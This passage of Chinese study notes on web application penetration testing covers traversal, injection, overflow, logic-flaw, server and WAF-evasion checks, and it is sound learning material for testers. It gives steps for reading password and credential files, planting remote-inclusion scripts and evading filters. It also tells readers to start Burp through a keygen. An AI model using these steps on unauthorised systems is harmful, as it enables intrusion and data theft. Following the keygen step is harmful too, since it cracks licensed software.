<li>基于模糊测试的结果，先进行分组，然后手动检查响应，看响应中是否包含了特定文件的内容，或者某些表示异常的信号；</li>
<li>从解析应用程序的结果中，找出那些基于用户输入读取或写入文件的功能。手动测试该功能，看是否存在路径遍历漏洞；</li>
<li>如果某个参数包含一个文件名、目录名或者部分文件分，尝试修改该参数值，插入子目录或者遍历序列，<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528081402.png" srcset="/img/loading.gif" lazyload></li>
<li>如果响应相同，则说明应用程序存在漏洞；如果响应不同，则说明应用程序对输入实施了某种过滤机制；</li>
<li>如果插入序列成功，则尝试上溯到根目录，并访问服务端操作系统中的已知文件；</li>
<li>如果访问失败，则说明应用程序实施了某种过滤机制，深入分析其过滤原理，以便找出规避办法；</li>
<li>有些应用程序可能会检查文件的扩展名，以限制用户只能访问特定类型的文件；尝试使用空字节或换行符来规避，在空字节或换行符之后，再接上正确的扩展名；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528081805.png" srcset="/img/loading.gif" lazyload></li>
<li>有些应用程序，可能会检查用户输入的文件名，是否以特定的单词做为开头，此时可以将遍历序列放在该特定单词后面，以避开过滤；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528081913.png" srcset="/img/loading.gif" lazyload></li>
<li>如果以上攻击办法都失败了，则可以尝试组合攻击。先对基础目录进行全面的测试，以了解应用程序实施的过滤机制和处理异常输入办法；</li>
<li>如果能够读取服务器上的任意文件，尝试读取以下文件，以扩大攻击范围：<ul>
<li>操作系统与应用程序的密码文件；</li>
<li>服务器与应用程序的配置文件（可用来发现其他漏洞或者优化已知漏洞的攻击办法）；</li>
<li>可能包含数据库访问凭据的文件；</li>
<li>应用程序的数据源，例如 MySQL 或 XML 文件；</li>
<li>程序的源代码，以便可以进行源代码审查发现更多漏洞，以及优化现在漏洞的攻击；</li>
<li>可能包含用户名和会话的日志文件；</li>
</ul>
</li>
<li>如果能够写入任意文件，可尝试实施以下攻击：<ul>
<li>在用户的启动文件夹中创建脚本；</li>
<li>当用户下一次连接时，修改 in.ftpd 等文件执行任意命令；</li>
<li>向应用程序放置可执行文件的目录中，写入脚本，以便浏览器可以访问它们；</li>
</ul>
</li>
</ul>
<h3 id="测试脚本注入"><a href="#测试脚本注入" class="headerlink" title="测试脚本注入"></a>测试脚本注入</h3><ul>
<li>模糊测试的时候，一般会在请求中发送 111111 字符串测试是否存在脚本注入漏洞；因此，可以在响应中搜索 11111 字符串，看注入是否成功；</li>
<li>检查脚本注入测试的响应中，是否包含错误消息，如果包含，说明输入的脚本被执行，预示漏洞存在；</li>
<li>如果发现的漏洞，则根据应用程序所使用的脚本语言类型，针对性的设计待注入的脚本，以便可以被应用程序正确的执行；</li>
</ul>
<h3 id="测试文件包含"><a href="#测试文件包含" class="headerlink" title="测试文件包含"></a>测试文件包含</h3><ul>
<li>在模糊测试时，有架设一台远程文件服务器，监控是否收到应用程序的请求。如果收到了，说明存在文件包含漏洞；</li>
<li>以单线程的方式，重复相关的测试，确定具体是哪些参数，触发了应用程序的请求；</li>
<li>另外，还需要检查测试结果中，存在响应异常延迟的结果。因为有些应用程序发出的请求可能因为网络过滤超时了，导致请求没有被远程文件服务器监控到。</li>
<li>如果发现远程文件包含漏洞，在远程文件服务器上，放置针对应用程序所使用的脚本语言编写的恶意脚本。然后检查这些脚本是否会应用程序被下载和执行；</li>
</ul>
<h2 id="测试特殊功能的输入漏洞"><a href="#测试特殊功能的输入漏洞" class="headerlink" title="测试特殊功能的输入漏洞"></a>测试特殊功能的输入漏洞</h2><p>有些输入漏洞，仅在一些特殊功能中才会出现，常见场景如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528083729.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="测试-SMTP-注入"><a href="#测试-SMTP-注入" class="headerlink" title="测试 SMTP 注入"></a>测试 SMTP 注入</h3><ul>
<li>如果应用程序包含与电子邮件有关的功能，则轮流提交以下字符串作为每一个参数，并在对应的位置插入电邮地址（Burp 中会自动完成这项任务的功能，以下字符串已经完成了 URL 编码，因此无须再次编码）：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528085245.png" srcset="/img/loading.gif" lazyload></li>
<li>检查应用程序返回的响应，看是否包含错误消息，如果消息内容跟电子邮件相关，确定是否可以调整输入，以便利用漏洞；</li>
<li>监控插入的邮件地址的邮箱，看是否收到应用程序发出的邮件；</li>
<li>仔细检查请求中的 HTML 表单，里面可能隐藏着一些有用的线索，例如表单中的某个隐藏或者禁用的字段，可能用来指定收件人地址，尝试对其进行修改；</li>
</ul>
<h3 id="测试编译型组件漏洞"><a href="#测试编译型组件漏洞" class="headerlink" title="测试编译型组件漏洞"></a>测试编译型组件漏洞</h3><h4 id="测试缓冲区溢出"><a href="#测试缓冲区溢出" class="headerlink" title="测试缓冲区溢出"></a>测试缓冲区溢出</h4><ul>
<li>向每个目标参数，轮流提交一系列稍大于常用缓冲区大小的长字符串，一次仅对一个参数实施攻击，以便最大限度的覆盖应用程序中的所有代码路径（可使用 Burp 中的有效字符块攻击荷载，做为自动生成不同长度字符串的源数据）；常见的长度为：1100（稍大于 1024）， 4200（稍大于4096），33000（稍大于32768）；</li>
<li>监控应用程序是否出现异常响应；任何未加以控制的溢出，几乎都会造成应用程序出现异常，只是此时客户端不容易进行远程诊断，可以尝试寻找以下反常现象：<ul>
<li>HTTP 500 状态码；</li>
<li>内容详细的消息，提示某个外部组成发生故障；</li>
<li>只收到局部或畸形的响应；</li>
<li>TCP 连接未返回响应，突然中断；</li>
<li>整个 Web 程序停止响应；</li>
<li>响应内容包含莫名其妙的结果，此时可能意味着内存中的数据窜了；</li>
</ul>
</li>
</ul>
<h4 id="测试整数漏洞"><a href="#测试整数漏洞" class="headerlink" title="测试整数漏洞"></a>测试整数漏洞</h4><ul>
<li>在测试编译型组件时，找出所有整数类型的数据，特别是长度指标符，因为很可能可以利用它来触发漏洞；</li>
<li>向每个目标参数，轮流提交一系列边界值（包含有符号和无符号两种类型），常见值如下：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528090928.png" srcset="/img/loading.gif" lazyload></li>
<li>当数据以十六进制表示时，此时可分别测试大端法和小端法两个版本；如果十六进制值以 ASCII 编码提交，则注意使用合法字符，以便提交的输入可以被应用程序正确编码；</li>
<li>监控应用程序的响应，寻找异常事件（方法同缓冲区溢出漏洞）；</li>
</ul>
<h3 id="测试格式化字符串漏洞"><a href="#测试格式化字符串漏洞" class="headerlink" title="测试格式化字符串漏洞"></a>测试格式化字符串漏洞</h3><ul>
<li>轮流向每一个参数提交包含一大溜各种格式说明符的字符串，示例如下：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528091333.png" srcset="/img/loading.gif" lazyload></li>
<li>监控应用程序的反应，留意异常事件；</li>
</ul>
<h3 id="测试-SOAP-注入"><a href="#测试-SOAP-注入" class="headerlink" title="测试 SOAP 注入"></a>测试 SOAP 注入</h3><blockquote>
<p>SOAP：simple object access protocol，用于在 Web 应用中传输结构化的消息（如对象）的一种协议，它使用 XML 作为数据格式，并依赖于应用层协议如 HTTP 来实现消息传递；相对于 JSON，SOAP 更加复杂一些，因为它不像 JSON 只负责数据，还负责数据传输、检验、权限等，它本质上是一个协议，因此它的处理速度要慢一些。JSON 只完全只管数据本身，其他工作都是交给开发者另行处理。</p>
</blockquote>
<ul>
<li>找出很可能使用 SOAP 处理的参数，尝试提交一个包含 XML 结束符的标签，例如 </foo></li>
<li>如果出现错误，说明漏洞可能存在；如果没有错误，说明存在净化过滤机制；</li>
<li>当出现错误时，尝试提交一对包含起始和结束的标签，例如 <foo></foo>，如果错误消失，则说明漏洞存在；</li>
<li>如果提交的攻击字符串在响应中原样返回，则尝试依次提交下面两个值，如果其中一个值的返回结果为另外一值，或者只是返回 test，那么说明插入成功了<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528091747.png" srcset="/img/loading.gif" lazyload></li>
<li>如果请求包含多个被 SOAP 处理的参数，尝试在一个参数中插入起始注释符，在另外一个参数中插入结束注释符。由于不知这些参数的处理顺序，因此应该尝试各种组合。</li>
<li>监控应用程序是否出现异常（当插入成功时，会注释部分 SOAP 数据，导致应用程序的逻辑出现异常）；</li>
</ul>
<h3 id="测试-LDAP-注入"><a href="#测试-LDAP-注入" class="headerlink" title="测试 LDAP 注入"></a>测试 LDAP 注入</h3><blockquote>
<p>Lightweight directory access protocol，用来访问目录的一种协议</p>
</blockquote>
<ul>
<li>如果应用程序包含某个使用 LDAP 协议和用户提交的参数来访问目录的功能，则针对每一个参数，轮流测试是否可以注入 LDAP 查询；</li>
<li>当在参数中包含 * 字符时，如果返回大量结果，则说明很可能使用 LDAP 进行查询；</li>
<li>尝试输入大量右括号，例如 )))))))))，如果输入导致查询错误或异常，则说明存在漏洞（右括号是常用的关键字，会使得应用程序的逻辑出现失效，因此，不仅 LDAP，应用程序中的许多其他功能都有可能失效）；</li>
<li>尝试输入各种干扰查询的表达式，看是否会影响查询结果；例如使用 cn，<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154302.png" srcset="/img/loading.gif" lazyload></li>
<li>尝试在输入结尾增加其他关键字，并用逗号分隔这些关键字；轮流测试每一个关键字，常见的关键字如下：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154514.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h3 id="测试-XPath-注入"><a href="#测试-XPath-注入" class="headerlink" title="测试 XPath 注入"></a>测试 XPath 注入</h3><blockquote>
<p>XPath 是一个用来读取 XML 内容的工具</p>
</blockquote>
<ul>
<li>尝试提交以下值，看是否会导致异常响应，但不至于造成报错：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154755.png" srcset="/img/loading.gif" lazyload></li>
<li>如果参数为数字，则可以尝试提交以下表达式：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154822.png" srcset="/img/loading.gif" lazyload></li>
<li>如果以上测试会导致应用程序返回异常结果，但没有报错，则说明漏洞很可能存在。可以尝试通过针对性设计的输入，一次提取一个字节的信息，从而获得任意的数据。例如，使用以下字符串尝试获取当前节点的父节点的名称：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529155008.png" srcset="/img/loading.gif" lazyload></li>
<li>得到父节点名称后，可以使用以下输入提取 XML 树中的所有数据：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529155127.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h3 id="测试外部请求注入"><a href="#测试外部请求注入" class="headerlink" title="测试外部请求注入"></a>测试外部请求注入</h3><ul>
<li>留意参数中是否包含表示内部某个服务名称，或者 IP 地址的情况，如果有的话，说明应用程序的某个功能需要访问其内部服务；此时可提交任务的服务名称和端口，观察响应是否出现超时。</li>
<li>另外也可以提交 localhost 和当前机器的  IP 地址，之后监控是否会接收到连接请求；</li>
<li>如果应用程序的某个功能会根据参数值返回特定的内容，则尝试在注入额外的参数值，观察响应结果是否不变，例如可注入：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529155732.png" srcset="/img/loading.gif" lazyload></li>
<li>如果响应内容不变，则说明没有检查额外参数注入，有可能存在参数注入漏洞。此时，如果恰好注入某个正确命名的键值对，有可能会改变应用程序的处理逻辑；</li>
</ul>
<h3 id="测试-XXE-注入"><a href="#测试-XXE-注入" class="headerlink" title="测试 XXE 注入"></a>测试 XXE 注入</h3><blockquote>
<p>XXE：或许是 XML external enterty 的缩写？</p>
</blockquote>
<ul>
<li>由于 XML 语法支持引用外部内容，因此当用户向服务器提交 XML 时，有可能可以实施外部实体注入攻击；</li>
<li>当应用程序返回所提交的 XML 中的某个节点值时，则\通过实体注入并赋值给相应字段，来获取外部内容；例如：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529160333.png" srcset="/img/loading.gif" lazyload></li>
<li>如果不知道返回的字段名称，则可以通常观察响应时间是否超时来判断是否注入成功，方法将外部实体设置为某个不存在的外部服务，例如 “<a target="_blank" rel="noopener" href="http://192.168.1.1:25"，">http://192.168.1.1:25&quot;，</a></li>
</ul>
<h2 id="测试逻辑缺陷-1"><a href="#测试逻辑缺陷-1" class="headerlink" title="测试逻辑缺陷"></a>测试逻辑缺陷</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529160545.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="确定关键的受攻击面"><a href="#确定关键的受攻击面" class="headerlink" title="确定关键的受攻击面"></a>确定关键的受攻击面</h3><ul>
<li>由于逻辑缺陷在应用程序中无处不在，表现形式多样，为了提高测试效率，可从最常见的位置开展测试；</li>
<li>常见位置包括：<ul>
<li>包含多个阶段的功能；</li>
<li>重要的安全功能，例如登录；</li>
<li>信任边界的状态变化，例如登录后，由匿名用户变成了注册用户；</li>
<li>检查和修改交易价格和数量；</li>
</ul>
</li>
</ul>
<h3 id="测试多阶段过程-1"><a href="#测试多阶段过程-1" class="headerlink" title="测试多阶段过程"></a>测试多阶段过程</h3><ul>
<li>如果某个包含多阶段的功能需要按照预定的顺序提交多个请求，则改变这些请求的顺序，例如直接忽略某个或多个步骤、重复访问某个步骤、跳回前面的步骤等，尽量发挥想象力，创造各种访问顺序的组合；</li>
<li>不同的步骤有可能由不同的 URL 来表示，也有可能由相同 URL 中的不同参数来表示，了解其表示办法，以确保访问顺序按预期进行；</li>
<li>尝试提取 A 步骤的参数，放到 B 步骤中；如果响应出现异常，则思考如何利用其中的逻辑漏洞 ；</li>
<li>如果在多阶段的功能中，存在多个用户操作相同的数据，则可以提取 A 用户的参数，放到 B 用户的请求中提交，观察应用程序如何响应；</li>
<li>思考开发者做出的假设和某种假设背面可能存在漏洞的位置，设计相应的请求办法，来探查判断是否正确；</li>
<li>当打乱顺序访问多阶段功能时，如果应用程序出现异常行为，分析收到的错误或调试消息，从中获取有用的线索，推测应用程序的逻辑，以便调整优化攻击；</li>
</ul>
<h3 id="测试不完整的输入"><a href="#测试不完整的输入" class="headerlink" title="测试不完整的输入"></a>测试不完整的输入</h3><ul>
<li>有些应用程序的功能涉及处理很多个用户提交的参数，并根据参数的不同值，调用不同的代码分支进行处理。此时有可能存在分支漏洞，例如未全面覆盖各种条件；</li>
<li>轮流测试每一个参数，在请求中删除相应的参数键值对，观察应用程序的响应。如果出现错误，观察错误消息中是否包含逻辑错误的线索；</li>
<li>如果所测试的功能刚好是一个多阶段功能，则应测试整个过程，因为有可能 A 步骤的数据会被保存在会话中，然后在 B 步骤中使用；</li>
</ul>
<h3 id="测试信任边界"><a href="#测试信任边界" class="headerlink" title="测试信任边界"></a>测试信任边界</h3><ul>
<li>探查应用程序如何处理用户的不同身份状态的变换（例如从匿名用户变为已注册用户）；留意相关功能，当用户提供一定的身份信息后，就可以实现身份状态的转变，例如提供个人资料实现注册，或者提供相关信息恢复账号等功能；</li>
<li>尝试寻找实现身份转变的各种办法，例如在 A 功能模块获取被信任的身份，然后直接跳转到 B 功能模块进行访问（这种跳转在正常操作的情况下不会发生），例如在恢复账号的功能中，先完成部分步骤，然后直接切换访问某个只能由已验证用户访问的页面，以测试应用程序是否会在切换过程中，没有做权限权限，授权用户预期之外的权限；</li>
<li>尝试确定是否可以通过利用某些高权限功能来直接或间接的访问或推测数据；</li>
</ul>
<h3 id="测试交易逻辑"><a href="#测试交易逻辑" class="headerlink" title="测试交易逻辑"></a>测试交易逻辑</h3><ul>
<li>如果应用程序设置交易限额，尝试提交负值，观察响应；如果没有报错，就可以通过提交负值进行反向交易；</li>
<li>分析是否有可能通过一连串的交易，让应用程序进行某个特定状态，在该特定状态下，可以实现某些目的。例如在多个账号之间，进行多次的小额交易，然后累积出某个应用程序原本不允许发生的余额；</li>
<li>如果应用程序根据用户提交的数据或操作，作为某种调整价格或其他敏感值的依据。可进一步了解应用程序使用的算法和调整逻辑。观察这种调整是一次性行为，还是会根据用户的操作反复进行修改；</li>
<li>分析这个调整逻辑和调整过程，看有没有办法找到一种操作组合，让其调整逻辑出现自相矛盾；</li>
</ul>
<h2 id="测试共享主机漏洞"><a href="#测试共享主机漏洞" class="headerlink" title="测试共享主机漏洞"></a>测试共享主机漏洞</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529173848.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="测试共享基础架构之间的隔离"><a href="#测试共享基础架构之间的隔离" class="headerlink" title="测试共享基础架构之间的隔离"></a>测试共享基础架构之间的隔离</h3><ul>
<li>如果应用程序运行于某种共享的硬件环境中时，那么一般需要给开发者提供某种访问机制，让其可以访问和管理该共享环境，因此，可以思考如下问题：<ul>
<li>远程访问机制是否使用安全的协议？</li>
<li>该共享的基础硬件架构，是否实施了安全强化？</li>
<li>客户端是否有可能访问其在正常情况下无法的文件、数据和其他资源？</li>
<li>客户端是否可以获得一个交互式的 shell 环境，并可以执行任意的命令？</li>
</ul>
</li>
<li>如果共享硬件为用户提供某个管理程序，让其自定义共享环境，考虑攻击该应用程序，以间接实现对运行在其中的程序的攻击；</li>
<li>如果可以通过应用程序运行命令、注入 SQL或访问任意文件，则仔细研究是否可以通过这些漏洞，攻击托管在相同共享硬件中的其他应用程序；</li>
</ul>
<h3 id="测试使用-ASP-托管的应用程序之间的隔离"><a href="#测试使用-ASP-托管的应用程序之间的隔离" class="headerlink" title="测试使用 ASP 托管的应用程序之间的隔离"></a>测试使用 ASP 托管的应用程序之间的隔离</h3><blockquote>
<p>ASP：application service provider；</p>
</blockquote>
<ul>
<li>如果应用程序使用 ASP 托管服务，那么一般来说，托管服务供应商会提供很多共享的常用组件，例如日志、管理界面、数据库等；这些组件被多个应用程序所共享使用；尝试攻击应用程序使用的这些共享组件，进而有可能间接实现对其他应用程序的攻击；</li>
<li>如果托管环境中使用某个常见的数据库，可使用数据库扫描工具如 NGSSquirrel 之类的工具，对该数据库进行详细的检查，包括配置、补丁版本、表结构以及权限控制等信息；然后上网搜索最新的漏洞信息，并加以利用，从而可以将攻击范围扩展到使用该共享数据库的所有应用程序；</li>
</ul>
<h2 id="测试-Web-服务器漏洞"><a href="#测试-Web-服务器漏洞" class="headerlink" title="测试 Web 服务器漏洞"></a>测试 Web 服务器漏洞</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529175548.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="测试默认密码"><a href="#测试默认密码" class="headerlink" title="测试默认密码"></a>测试默认密码</h3><ul>
<li>根据应用程序解析结果，推断所使用的 Web 服务器软件和相关技术，以及是否包含可访问的管理接口；</li>
<li>对 Web 服务器实施端口扫描，确定除了应用程序外，其他可能在运行的程序；</li>
<li>如果已知端口号，查询相关文档和常用的默认密码，检查是否密码有效；</li>
<li>如果密码无效，使用第 21 章的技巧，尝试猜测有效的密码；</li>
<li>如果能够访问管理接口，检查可用的功能，看是否可以加以利用，间接攻破主机和目标应用程序；</li>
</ul>
<h3 id="测试默认内容"><a href="#测试默认内容" class="headerlink" title="测试默认内容"></a>测试默认内容</h3><ul>
<li>使用 Nikto 等工具进行扫描，找出服务器上存在的，但不属于应用程序负责的默认内容；</li>
<li>使用搜索引擎和相关网站（如 <a target="_blank" rel="noopener" href="http://www.exploit-db.com),查找相关服务器软件的默认内容和功能;如果可以,在本地安装这些软件,并测试其可被利用的默认功能;/">www.exploit-db.com），查找相关服务器软件的默认内容和功能；如果可以，在本地安装这些软件，并测试其可被利用的默认功能；</a></li>
<li>检查默认内容，分析里面是否包含可用于攻击服务器软件或目标应用唾弃的功能或漏洞；</li>
</ul>
<h3 id="测试危险的-HTTP-方法"><a href="#测试危险的-HTTP-方法" class="headerlink" title="测试危险的 HTTP 方法"></a>测试危险的 HTTP 方法</h3><ul>
<li>使用 OPTIONS 罗列应用程序接受的所有可用方法（不同的路径，可用的方法不尽相同）；可以使用第三方工具（如 Paros）进行扫描，提交检查的效率；</li>
<li>手动测试每一种方法，确定其确实可用；</li>
<li>如果发现某些 WebDAV 方法被激活（WebDAV 是一种 HTTP 扩展技术，它允许客户端实现对远程内容的操作），则可以利用一些可激活该功能的客户端进行探查（如可在 Microsoft FrontPage 或 IE 中打开 Open as Web Folder 选项）；</li>
</ul>
<h3 id="测试代理功能"><a href="#测试代理功能" class="headerlink" title="测试代理功能"></a>测试代理功能</h3><ul>
<li>使用 GET 和 CONNECT 请求，尝试将 Web 服务器作为代理服务器，连接因特网上的其他服务器，并获取其上面的内容；</li>
<li>尝试访问目标应用程序所有的网络环境中的不同 IP 地址和端口；</li>
<li>尝试指定 127.0.0.1 作为目标主机，连接 Web 服务器上的常用端口号；</li>
</ul>
<h3 id="测试虚拟主机配置不当"><a href="#测试虚拟主机配置不当" class="headerlink" title="测试虚拟主机配置不当"></a>测试虚拟主机配置不当</h3><blockquote>
<p>同一台服务器可能部署多个应用程序，此时服务器软件通过 host 消息头中的值，来区分应将流量转发给哪个应用程序；</p>
</blockquote>
<ul>
<li>使用以下技巧向根目录提交 GET 请求<ul>
<li>正确的 host 消息头；</li>
<li>恶意的 host 消息头；</li>
<li>host 消息头写入服务器的 IP 地址；</li>
<li>删除 host 消息头；</li>
</ul>
</li>
<li>比较这些请求返回的响应。通常在 host 消息头中使用服务器的 IP 地址时，有可能获得目录列表，以及其他各种默认内容；</li>
<li>如果应用程序出现异常行为，提取造成异常行为的主机名称，重复应用程序的解析环节。并使用 -vhost 选项再运行一次 Nikto 扫描，以便尽量找出在前面所有环节中忽略的默认内容；</li>
</ul>
<h3 id="测试-Web-服务器软件漏洞"><a href="#测试-Web-服务器软件漏洞" class="headerlink" title="测试 Web 服务器软件漏洞"></a>测试 Web 服务器软件漏洞</h3><ul>
<li>使用 Nessus 之类的扫描器，查找 Web 服务器软件中的所有已知漏洞；</li>
<li>浏览 Security Focus、Bugtraq、Full Disclosure 等网站，查找最新发现尚未修复的漏洞消息；</li>
<li>如果应用程序由第三方开发，检查其是否自带服务器软件（通常是某个开源软件）；如果有，查找该软件所有已知漏洞（注意：服务器的版本信息有可能被修改）；</li>
<li>如果可以，在本地安装相应的软件，在本地自行测试，查找未被发现的或广泛流传的新漏洞；</li>
</ul>
<h3 id="测试-Web-应用程序防火墙"><a href="#测试-Web-应用程序防火墙" class="headerlink" title="测试 Web 应用程序防火墙"></a>测试 Web 应用程序防火墙</h3><ul>
<li>在请求中提交任意的参数名称，并在在参数值中使用常见的有效攻击荷载（最好是在响应中会返回该参数值的位置），如果请求被阻止，说明应用程序有可能某种防御机制（第三方组件）；</li>
<li>如果某个路径会在响应中返回请求参数，则提交一系列模糊测试字符串，以及它们相应的编码形式，用来探查应用程序的防御机制；</li>
<li>对正常的参数重复相同的测试，看问题是否会重现；如果会的话，可以进一步确认防御机制的存在；</li>
<li>查询防御机制中常见的关键字匹配，在所有的模糊测试字符串，避免出现这些字符串，而是使用不可能存在的一些其他字符串作为有效的攻击荷载，例如：<ul>
<li>检索文件时，避免使用 /etc/passwd 或者 /windows/system32/config/sam 之类的字符串；</li>
<li>XSS 攻击中，避免使用 &lt;script> 标签；避免使用 alert() 或 xss 等字样；</li>
</ul>
</li>
<li>如果插入在特定位置的请求被阻止，则可以尝试在其他位置提交相同的参数，例如：<ul>
<li>GET 请求的 URL 中；</li>
<li>POST 请求主体中；</li>
<li>POST 请求的 URL 中；</li>
</ul>
</li>
<li>如果应用程序使用 ASP.NET 作为开发语言，则可以尝试在 cookie 中提交参数，因为当 ASP 程序在查询字符串或消息主体中查询不到指定的参数时，默认会跑到 cookie 中去查询；</li>
<li>尝试在第 4 章提到的其他插入方法，检查是否某些方式未被机制所覆盖；</li>
<li>找出所有可以使用非标准格式（如序列化或编码）提交参数的位置；如果找不到，可以尝试在多个变量中，对攻击字符串使用合并 concatenation + 拆分 spanning 和合并 concatenation / 拆分 spanning 两种方式进行组合（如果应用程序使用 ASP.NET 开发，可以考虑使用 HPP，HTML Parameter Polution，通过同一变量的不同变化来串联攻击字符串）；</li>
</ul>
<h2 id="其他检查"><a href="#其他检查" class="headerlink" title="其他检查"></a>其他检查</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601085820.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="测试基于-DOM-的攻击"><a href="#测试基于-DOM-的攻击" class="headerlink" title="测试基于 DOM 的攻击"></a>测试基于 DOM 的攻击</h3><ul>
<li>审查应用程序的前端 JS 代码，寻找漏洞，看是否可以通过插入某个专门设计的 URL 到页面中，从而能够引入恶意脚本，实现 XSS 攻击或者重定向攻击；审查的内容涵盖静态和动态生成的所有 JS 脚本；</li>
<li>留意调用以下 API 的位置，因此这些 API 功能很强大，可以用来引入恶意脚本；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601090249.png" srcset="/img/loading.gif" lazyload></li>
<li>追踪 JS 代码处理数据的流程和逻辑，检查其对数据做了何种操作。如果数据的处理，调用了以下 API，则可能存在 XSS 漏洞：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601090411.png" srcset="/img/loading.gif" lazyload></li>
<li>如果数据处理调用了以下 API，则可能存在重定向漏洞；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601090447.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h3 id="测试本地隐私漏洞"><a href="#测试本地隐私漏洞" class="headerlink" title="测试本地隐私漏洞"></a>测试本地隐私漏洞</h3><ul>
<li>检查拦截器的日志，寻找包含 set-cookie 指令的响应，指令中可能包含 expire 属性，表示浏览器会将该 cookie 保存到该时间点。检查持久性 cookie 中是否传送敏感数据；</li>
<li>如果 cookie 中包含敏感数据，则攻击者就可以利用这些数据，即使数据被加密过了，攻击者仍然可以将它们提交给服务端，访问该 cookie 能够访问的数据或功能；</li>
<li>当某个 HTTP 响应包含敏感数据时，留意响应报头中的缓存指令相关的字段。如果没有特别指示不缓存的话，浏览器默认都是会缓存的，相关的字段包括：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210602072751.png" srcset="/img/loading.gif" lazyload></li>
<li>检查应用程序使用 URL 参数传送敏感数据的所有情况，因为这种情况意味着这些敏感数据会保存在很多地方，例如浏览器的历史记录、服务端的日志等；</li>
<li>检查所有让用户提交敏感数据的表单，如果表单中没有关闭自动填充功能，则意味着输入的数据已经被浏览器保存起来了。</li>
</ul>
<h3 id="测试脆弱的-SSL-加密算法"><a href="#测试脆弱的-SSL-加密算法" class="headerlink" title="测试脆弱的 SSL 加密算法"></a>测试脆弱的 SSL 加密算法</h3><ul>
<li>如果应用程序使用 SSL 进行通信，可以使用 THCSSLCheck 等工具，检查其所使用的加密算法和协议。</li>
<li>如果应用程序使用脆弱或过时的加密算法和协议，攻击者就可能有机会破译或降级 SSL 通信，访问其中包含的敏感数据；</li>
<li>虽然有些 Web 服务器软件表面声明支持某些脆弱算法和协议，但实际上可能并没有默认开启这种支持，因此在使用 THCSSLCheck 工具进行检查之前，可以使用 Opera 浏览器，通过指定的脆弱协议尝试完成一次握手，以确定是否真的支持。</li>
</ul>
<h3 id="检查同源策略配置"><a href="#检查同源策略配置" class="headerlink" title="检查同源策略配置"></a>检查同源策略配置</h3><ul>
<li>检查 /crossdomain.xml 文件，如果应用程序未设置同源范围，例如 allow-access-from domain="*"，则意味着任何来自其他域的 Flash 对象可以访问应用程序，检索所有数据，并执行任何用户操作；</li>
<li>检查 /clientaccesspolicy.xml，原因同上；</li>
<li>可在请求中的 Origin 消息头添加其他域名，然后检查响应中的 Access-Control 字段，测试应用程序如何处理跨域请求；</li>
</ul>
<h2 id="检查信息泄露"><a href="#检查信息泄露" class="headerlink" title="检查信息泄露"></a>检查信息泄露</h2><ul>
<li>在测试应用程序的过程中，留意所有可能泄露其所使用的技术、程序内部结构、功能、错误原因等的信息；</li>
<li>如果发现不常见的错误，使用搜索引擎进行查询（可使用搜索引擎的高级特性来缩小查询范围，例如指定 filetype）；<ul>
<li>查询所有有关该错误信息的讨论，以及查看出现相同问题的其他站点。因为有可能其他站点显示的错误信息内容更加丰富，有助于了解错误的发生原因。</li>
<li>另外还可以通过搜索引擎的缓存搜索一些历史错误消息；</li>
</ul>
</li>
<li>使用 google 代码搜索功能，搜索与特定错误消息相关的公开代码；</li>
<li>搜索可能被硬编码到应用程序源代码中的错误消息片段（可使用高级搜索特性，指定特定的代码语言或相关的已知细节，例如：lang:php package:mail）；</li>
<li>如果在错误消息中发现第三方库或组件的名称，在搜索引擎中查询这些名称；</li>
</ul>
<h1 id="22-其他"><a href="#22-其他" class="headerlink" title="22. 其他"></a>22. 其他</h1><h2 id="工具使用说明"><a href="#工具使用说明" class="headerlink" title="工具使用说明"></a>工具使用说明</h2><h3 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul>
<li>先使用 java -jar <keygen.jar> 来启动 keygen 程序；</li>
<li>再用 keygen 里面提供的命令来启动 burp，并进行注册；</li>
<li>之后每一次启动，都需要使用 keygen 作为参数来启动 burp，可将其做成快捷方式放在桌面上，点击快速启动</li>
</ul>
<blockquote>
<p> 备注：由于 java 命令参数用到 noverify，但该参数在新版本的 jdk 中已经废弃，因此需要单独安装一下 1.8 版本的 openjdk，并使用命令 update-alternatives --config java 来更改默认使用的版本</p>
</blockquote>
<h2 id="手机端测试"><a href="#手机端测试" class="headerlink" title="手机端测试"></a>手机端测试</h2><h3 id="电脑端添加监听"><a href="#电脑端添加监听" class="headerlink" title="电脑端添加监听"></a>电脑端添加监听</h3><ul>
<li>Proxy->Options->Proxy Listeners，点击 add 按钮添加新的监听器</li>
<li>Bind to port 可设置为 8082</li>
